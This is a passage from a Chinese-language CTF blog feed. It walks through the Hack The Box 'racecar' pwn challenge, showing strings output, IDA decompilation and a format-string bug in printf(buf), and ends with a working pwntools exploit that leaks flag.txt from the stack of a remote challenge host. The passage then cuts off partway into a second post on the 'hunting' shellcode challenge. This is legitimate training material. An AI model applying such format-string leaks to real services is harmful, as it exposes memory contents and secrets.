class=\"line\">Name:</span><br><span class=\"line\">Nickname:</span><br><span class=\"line\">%s[+] Welcome [%s%s%s]!</span><br><span class=\"line\">%s[*] Your name is [%s%s%s] but everybody calls you.. [%s%s%s]!</span><br><span class=\"line\">[*] Current coins: [%d]</span><br><span class=\"line\">Car #1 stats:</span><br><span class=\"line\">[Speed]:        %s</span><br><span class=\"line\">[Acceleration]: %s</span><br><span class=\"line\">[Handling]:     %s</span><br><span class=\"line\">Car #2 stats:</span><br><span class=\"line\">[Speed]:        %s</span><br><span class=\"line\">[Acceleration]: %s</span><br><span class=\"line\">[Handling]:     %s</span><br><span class=\"line\">1. Car info</span><br><span class=\"line\">2. Car selection</span><br><span class=\"line\">;*2$&quot;</span><br><span class=\"line\">GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</span><br><span class=\"line\">crtstuff.c</span><br><span class=\"line\">deregister_tm_clones</span><br><span class=\"line\">__do_global_dtors_aux</span><br><span class=\"line\">completed.7283</span><br><span class=\"line\">__do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">frame_dummy</span><br><span class=\"line\">__frame_dummy_init_array_entry</span><br><span class=\"line\">racecar.c</span><br><span class=\"line\">__FRAME_END__</span><br><span class=\"line\">__init_array_end</span><br><span class=\"line\">_DYNAMIC</span><br><span class=\"line\">__init_array_start</span><br><span class=\"line\">__GNU_EH_FRAME_HDR</span><br><span class=\"line\">_GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">__libc_csu_fini</span><br><span class=\"line\">strcmp@@GLIBC_2.0</span><br><span class=\"line\">read@@GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__x86.get_pc_thunk.bx</span><br><span class=\"line\">printf@@GLIBC_2.0</span><br><span class=\"line\">fgets@@GLIBC_2.0</span><br><span class=\"line\">_edata</span><br><span class=\"line\">time@@GLIBC_2.0</span><br><span class=\"line\">sleep@@GLIBC_2.0</span><br><span class=\"line\">alarm@@GLIBC_2.0</span><br><span class=\"line\">__stack_chk_fail@@GLIBC_2.4</span><br><span class=\"line\">__x86.get_pc_thunk.dx</span><br><span class=\"line\">__cxa_finalize@@GLIBC_2.1.3</span><br><span class=\"line\">banner</span><br><span class=\"line\">malloc@@GLIBC_2.0</span><br><span class=\"line\">__data_start</span><br><span class=\"line\">puts@@GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">exit@@GLIBC_2.0</span><br><span class=\"line\">__dso_handle</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">race_type</span><br><span class=\"line\">srand@@GLIBC_2.0</span><br><span class=\"line\">strlen@@GLIBC_2.0</span><br><span class=\"line\">__libc_start_main@@GLIBC_2.0</span><br><span class=\"line\">__libc_csu_init</span><br><span class=\"line\">car_menu</span><br><span class=\"line\">stdin@@GLIBC_2.0</span><br><span class=\"line\">read_int</span><br><span class=\"line\">setvbuf@@GLIBC_2.0</span><br><span class=\"line\">fopen@@GLIBC_2.1</span><br><span class=\"line\">putchar@@GLIBC_2.0</span><br><span class=\"line\">_fp_hw</span><br><span class=\"line\">car_info</span><br><span class=\"line\">stdout@@GLIBC_2.0</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">main</span><br><span class=\"line\">coins</span><br><span class=\"line\">__stack_chk_fail_local</span><br><span class=\"line\">check</span><br><span class=\"line\">atoi@@GLIBC_2.0</span><br><span class=\"line\">__TMC_END__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">setup</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.plt.got</span><br><span class=\"line\">.text</span><br><span class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>发现里面有一个 flag.txt</p>\n<p>拖入 ida32 查看 main 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v3; // eax</span><br><span class=\"line\">  unsigned int v5; // [esp+0h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(0x14u);</span><br><span class=\"line\">  setup();</span><br><span class=\"line\">  banner();</span><br><span class=\"line\">  info();</span><br><span class=\"line\">  while ( check )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = menu();</span><br><span class=\"line\">    if ( v3 == 1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      car_info();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if ( v3 == 2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      check = 0;</span><br><span class=\"line\">      car_menu();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return __readgsdword(0x14u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>setup ();banner ();info (); 进行了初始化</p>\n<p>双击 while (check) 可得知 check 为 1，</p>\n<p>v3 = menu (); 直接调用了 menu 我们去 menu 查看一下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int menu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v1; // [esp+0h] [ebp-18h]</span><br><span class=\"line\">  int v2; // [esp+4h] [ebp-14h]</span><br><span class=\"line\">  int v3; // [esp+8h] [ebp-10h]</span><br><span class=\"line\"></span><br><span class=\"line\">  do</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;\\n1. Car info\\n2. Car selection\\n&gt; &quot;);</span><br><span class=\"line\">    v3 = read_int(v1, v2);</span><br><span class=\"line\">    if ( v3 != 2 &amp;&amp; v3 != 1 )</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  while ( v3 != 2 &amp;&amp; v3 != 1 );</span><br><span class=\"line\">  return v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>v3 等于了 read_int (v1,v2)</p>\n<p>查看 read_int</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int read_int()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char buf[32]; // [esp+Ch] [ebp-2Ch] BYREF</span><br><span class=\"line\">  unsigned int v2; // [esp+2Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readgsdword(0x14u);</span><br><span class=\"line\">  read(0, buf, 0x1Fu);</span><br><span class=\"line\">  return atoi(buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>所以 v3 等于用户输入的数，最大为 0x1f 也就是 31</p>\n<p>现在就看 v3 值为多少了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3 = menu();</span><br><span class=\"line\">if ( v3 == 1 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  car_info();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else if ( v3 == 2 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  check = 0;</span><br><span class=\"line\">  car_menu();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果 v3 等于 1 调用 car_info ()</p>\n<p>如果 v3 等于 2 调用 car_menu () 并且 check=0 停止循环</p>\n<p>先看 car_info () 发现并没有什么内容只是进行了输出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsigned int car_info()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int v1; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readgsdword(0x14u);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  puts(aCar1Stats);</span><br><span class=\"line\">  printf(aSpeedS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aAccelerationS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aHandlingS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  puts(aCar2Stats);</span><br><span class=\"line\">  printf(aSpeedS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aAccelerationS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  printf(aHandlingS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  puts(asc_1BB0);</span><br><span class=\"line\">  return __readgsdword(0x14u) ^ v1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>查看 car_menu () 看到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int car_menu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int v0; // eax</span><br><span class=\"line\">  size_t i; // eax</span><br><span class=\"line\">  size_t v2; // edx</span><br><span class=\"line\">  int result; // eax</span><br><span class=\"line\">  int v4; // [esp+0h] [ebp-58h]</span><br><span class=\"line\">  int v5; // [esp+0h] [ebp-58h]</span><br><span class=\"line\">  int v6; // [esp+4h] [ebp-54h]</span><br><span class=\"line\">  int v7; // [esp+4h] [ebp-54h]</span><br><span class=\"line\">  unsigned int v8; // [esp+8h] [ebp-50h]</span><br><span class=\"line\">  int v9; // [esp+Ch] [ebp-4Ch]</span><br><span class=\"line\">  int v10; // [esp+10h] [ebp-48h]</span><br><span class=\"line\">  void *buf; // [esp+18h] [ebp-40h]</span><br><span class=\"line\">  FILE *stream; // [esp+1Ch] [ebp-3Ch]</span><br><span class=\"line\">  char v13[44]; // [esp+20h] [ebp-38h] BYREF</span><br><span class=\"line\">  unsigned int v14; // [esp+4Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v14 = __readgsdword(0x14u);</span><br><span class=\"line\">  v4 = -1;</span><br><span class=\"line\">  v6 = -1;</span><br><span class=\"line\">  do</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(aSelectCar1);</span><br><span class=\"line\">    v9 = read_int(v4, v6);</span><br><span class=\"line\">    if ( v9 != 2 &amp;&amp; v9 != 1 )</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  while ( v9 != 2 &amp;&amp; v9 != 1 );</span><br><span class=\"line\">  v10 = race_type();</span><br><span class=\"line\">  v0 = time(0);</span><br><span class=\"line\">  srand(v0);</span><br><span class=\"line\">  if ( v9 == 1 &amp;&amp; v10 == 2 || v9 == 2 &amp;&amp; v10 == 2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 10;</span><br><span class=\"line\">    v7 = rand() % 100;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v9 == 1 &amp;&amp; v10 == 1 || v9 == 2 &amp;&amp; v10 == 1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 100;</span><br><span class=\"line\">    v7 = rand() % 10;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 100;</span><br><span class=\"line\">    v7 = rand() % 100;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v8 = 0;</span><br><span class=\"line\">  for ( i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;); ; i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = i;</span><br><span class=\"line\">    result = v8;</span><br><span class=\"line\">    if ( v2 &lt;= v8 )</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    putchar(aWaitingForTheR[v8]);</span><br><span class=\"line\">    if ( aWaitingForTheR[v8] == 46 )</span><br><span class=\"line\">      sleep(0);</span><br><span class=\"line\">    ++v8;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  if ( v9 == 1 &amp;&amp; (result = v5, v5 &lt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &gt; v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;%s\\n\\n[+] You won the race!! You get 100 coins!\\n&quot;, &quot;\\x1B[1;32m&quot;);</span><br><span class=\"line\">    coins += 100;</span><br><span class=\"line\">    printf(&quot;[+] Current coins: [%d]%s\\n&quot;, coins, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">    printf(&quot;\\n[!] Do you have anything to say to the press after your big victory?\\n&gt; %s&quot;, &quot;\\x1B[0m&quot;);</span><br><span class=\"line\">    buf = malloc(0x171u);</span><br><span class=\"line\">    stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class=\"line\">    if ( !stream )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      printf(&quot;%s[-] Could not open flag.txt. Please contact the creator.\\n&quot;, &quot;\\x1B[1;31m&quot;);</span><br><span class=\"line\">      exit(105);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fgets(v13, 44, stream);</span><br><span class=\"line\">    read(0, buf, 0x170u);</span><br><span class=\"line\">    puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;);</span><br><span class=\"line\">    return printf((const char *)buf);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v9 == 1 &amp;&amp; (result = v5, v5 &gt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &lt; v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;%s\\n\\n[-] You lost the race and all your coins!\\n&quot;, &quot;\\x1B[1;31m&quot;);</span><br><span class=\"line\">    coins = 0;</span><br><span class=\"line\">    return printf(&quot;[+] Current coins: [%d]%s\\n&quot;, 0, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>里面调用了一个 fopen 打开了一个 flag.txt 我们目标出现了</p>\n<p>分析一下这个代码</p>\n<p>一开始赋值给 v4 以及 v6 为 - 1 使用了一个</p>\n<p>do while 循环判断是否为 1 或 2，如果为其他数的话就打印</p>\n<p>[-] Invalid choice!</p>\n<p>然后调用 race_type () 其实也是一样</p>\n<p>然后设置 srand (time (0))</p>\n<p>if ( v9 == 1 &amp;&amp; (result = v5, v5 &lt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &gt; v7) )</p>\n<p>这个判断的话就是你要么输入 2 不然就为假</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fgets(v13, 44, stream);</span><br><span class=\"line\">read(0, buf, 0x170u);</span><br><span class=\"line\">puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;);</span><br><span class=\"line\">return printf((const char *)buf);</span><br></pre></td></tr></table></figure></p>\n<p>现在可以利用的点就说这个 printf 的格式化字符串溢出</p>\n<p>那我们利用脚本来输出看看</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"> </span><br><span class=\"line\">offset_start_flag = 12</span><br><span class=\"line\">len_of_flag = 44</span><br><span class=\"line\">offset_end_flag = offset_start_flag + 11</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">formatstring = &quot;&quot;</span><br><span class=\"line\"> </span><br><span class=\"line\">for i in range(offset_start_flag, offset_end_flag):</span><br><span class=\"line\">    formatstring += &quot;%&quot;+str(i)+&quot;$p &quot;</span><br><span class=\"line\">print(formatstring) </span><br><span class=\"line\"> </span><br><span class=\"line\">r = remote(&quot;167.99.82.136&quot;,30709)</span><br><span class=\"line\"> </span><br><span class=\"line\">r.sendlineafter(&quot;Name: &quot;, &quot;a&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;Nickname: &quot;, &quot;a&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;1&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)</span><br><span class=\"line\"> </span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, formatstring)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">response = r.recv()</span><br><span class=\"line\"> </span><br><span class=\"line\"># Format output</span><br><span class=\"line\">preflag = (response.decode(&quot;utf-8&quot;).split(&quot;m\\n&quot;))[1]</span><br><span class=\"line\">preflag = preflag.split()</span><br><span class=\"line\"> </span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\">for hexdecimal in preflag:</span><br><span class=\"line\">    flag += p32(int(hexdecimal, base=16)).decode(&quot;utf-8&quot;)</span><br><span class=\"line\"> </span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-hunting-md/",
            "url": "https://lookhui.github.io/HTB-hunting-md/",
            "title": "HTB-hunting",
            "date_published": "2023-12-13T07:18:01.000Z",
            "content_html": "<h1 id=\"htb-hunting\"><a class=\"anchor\" href=\"#htb-hunting\">#</a> HTB-hunting</h1>\n<p>这是一道手写 shellcode 题目</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX disabled</span><br><span class=\"line\">PIE:      PIE enabled</span><br><span class=\"line\">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>\n<p>开启了 PIE 地址随机化</p>\n<p>使用 strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tdH</span><br><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">strcpy</span><br><span class=\"line\">exit</span><br><span class=\"line\">srand</span><br><span class=\"line\">perror</span><br><span class=\"line\">signal</span><br><span class=\"line\">mmap</span><br><span class=\"line\">prctl</span><br><span class=\"line\">memset</span><br><span class=\"line\">read</span><br><span class=\"line\">alarm</span><br><span class=\"line\">close</span><br><span class=\"line\">open</span><br><span class=\"line\">__cxa_finalize</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">GLIBC_2.1.3</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">prctl(PR_SET_NO_NEW_PRIVS)</span><br><span class=\"line\">prctl(PR_SET_SECCOMP)</span><br><span class=\"line\">/dev/urandom</span><br><span class=\"line\">9*2$&quot;</span><br><span class=\"line\">HTB&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;</span><br><span class=\"line\">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.note.gnu.property</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span 